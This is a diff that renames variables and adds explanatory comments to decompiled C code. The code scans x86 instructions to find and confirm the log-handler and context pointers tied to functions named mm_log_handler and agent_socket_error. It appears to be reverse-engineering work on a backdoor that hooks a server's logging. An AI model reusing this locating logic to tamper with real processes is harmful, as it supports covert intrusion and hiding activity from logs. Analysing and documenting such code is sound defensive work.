@@ -19,55 +19,61 @@ BOOL validate_log_handler_pointers
                global_context_t *global)
 
 {
-  void *mem_address;
-  BOOL success;
-  ptrdiff_t pointer_gap;
-  u8 *function_start;
-  u8 **function_end_ptr;
-  u64 branch_disp;
-  int opcode;
-  u64 insn_size;
-  void *log_handler_slot;
-  long gap;
-  u8 *insn_ptr;
-  u8 **scan_ctx;
-  u8 *block_end;
-  u8 *function_end;
-  BOOL scan_success;
-  u8 *dasm_ip;
+  void *handler_struct_addr;
+  BOOL match_success;
+  ptrdiff_t slot_distance;
+  u8 *scan_range_start;
+  u8 **scan_range_end;
+  u64 lea_rel32_copy;
+  int lea_opcode_word;
+  u64 lea_mem_disp_bytes;
+  void *lea_ctx_slot;
+  long slot_delta;
+  u8 *lea_ctx_instr_ptr;
+  u8 **bounded_func_range;
+  u8 *lea_insn_ptr;
+  u8 *lea_rel32_disp;
+  u32 lea_opcode_signature;
+  u8 *lea_insn_size;
   
-  function_end_ptr = &block_end;
-  for (pointer_gap = 0x16; pointer_gap != 0; pointer_gap = pointer_gap + -1) {
-    *(undefined4 *)function_end_ptr = 0;
-    function_end_ptr = (u8 **)((long)function_end_ptr + 4);
+  scan_range_end = &lea_insn_ptr;
+  for (slot_distance = 0x16; slot_distance != 0; slot_distance = slot_distance + -1) {
+    *(undefined4 *)scan_range_end = 0;
+    scan_range_end = (u8 **)((long)scan_range_end + 4);
   }
+  // AutoDoc: Reject identical or NULL slots up front—the handler and ctx pointers must be distinct globals.
   if ((addr1 != addr2 && addr1 != (void *)0x0) && (addr2 != (void *)0x0)) {
-    pointer_gap = (long)addr2 - (long)addr1;
+    slot_distance = (long)addr2 - (long)addr1;
     if (addr2 <= addr1) {
-      pointer_gap = (long)addr1 - (long)addr2;
+      slot_distance = (long)addr1 - (long)addr2;
     }
-    if (((pointer_gap < 0x10) &&
-        (mem_address = (refs->mm_log_handler).func_start, mem_address != (void *)0x0)) &&
-       (function_start = (u8 *)(refs->agent_socket_error).func_start, function_start != (u8 *)0x0)) {
-      function_end_ptr = (u8 **)(refs->agent_socket_error).func_end;
-      success = find_lea_instruction_with_mem_operand
-                        (function_start,(u8 *)function_end_ptr,(dasm_ctx_t *)&block_end,mem_address);
-      function_start = block_end;
-      if (success != FALSE) {
-        success = x86_dasm((dasm_ctx_t *)&block_end,function_end + (long)block_end,(u8 *)function_end_ptr);
-        if ((success != FALSE) && (scan_success == 0x168)) {
-          scan_ctx = (u8 **)0x0;
-          function_start = function_end + (long)dasm_ip + (long)block_end;
-          find_function(function_start,(void **)0x0,&scan_ctx,(u8 *)search_base,code_end,
+    // AutoDoc: Only chase candidates that sit within 0x10 bytes of one another; the globals live side-by-side in `.bss`.
+    if (((slot_distance < 0x10) &&
+        (handler_struct_addr = (refs->mm_log_handler).func_start, handler_struct_addr != (void *)0x0)) &&
+       (scan_range_start = (u8 *)(refs->agent_socket_error).func_start, scan_range_start != (u8 *)0x0)) {
+      scan_range_end = (u8 **)(refs->agent_socket_error).func_end;
+      // AutoDoc: Use the cached string reference to find the LEA that materialises the handler struct.
+      match_success = find_lea_instruction_with_mem_operand
+                        (scan_range_start,(u8 *)scan_range_end,(dasm_ctx_t *)&lea_insn_ptr,handler_struct_addr);
+      scan_range_start = lea_insn_ptr;
+      if (match_success != FALSE) {
+        match_success = x86_dasm((dasm_ctx_t *)&lea_insn_ptr,lea_rel32_disp + (long)lea_insn_ptr,
+                         (u8 *)scan_range_end);
+        if ((match_success != FALSE) && (lea_opcode_signature == 0x168)) {
+          bounded_func_range = (u8 **)0x0;
+          scan_range_start = lea_rel32_disp + (long)lea_insn_size + (long)lea_insn_ptr;
+          // AutoDoc: Once the LEA decodes cleanly, bound the owning routine so the MOV scan stays inside that function.
+          find_function(scan_range_start,(void **)0x0,&bounded_func_range,(u8 *)search_base,code_end,
                         global->uses_endbr64);
-          function_end_ptr = scan_ctx;
+          scan_range_end = bounded_func_range;
         }
-        success = find_instruction_with_mem_operand_ex
-                          (function_start,(u8 *)function_end_ptr,(dasm_ctx_t *)0x0,0x109,addr1);
-        if (success != FALSE) {
-          success = find_instruction_with_mem_operand_ex
-                            (function_start,(u8 *)function_end_ptr,(dasm_ctx_t *)0x0,0x109,addr2);
-          return (uint)(success != FALSE);
+        // AutoDoc: Require two independent MOV [mem],reg hits—one targeting each candidate slot—before accepting the pair.
+        match_success = find_instruction_with_mem_operand_ex
+                          (scan_range_start,(u8 *)scan_range_end,(dasm_ctx_t *)0x0,0x109,addr1);
+        if (match_success != FALSE) {
+          match_success = find_instruction_with_mem_operand_ex
+                            (scan_range_start,(u8 *)scan_range_end,(dasm_ctx_t *)0x0,0x109,addr2);
+          return (uint)(match_success != FALSE);
         }
       }
     }
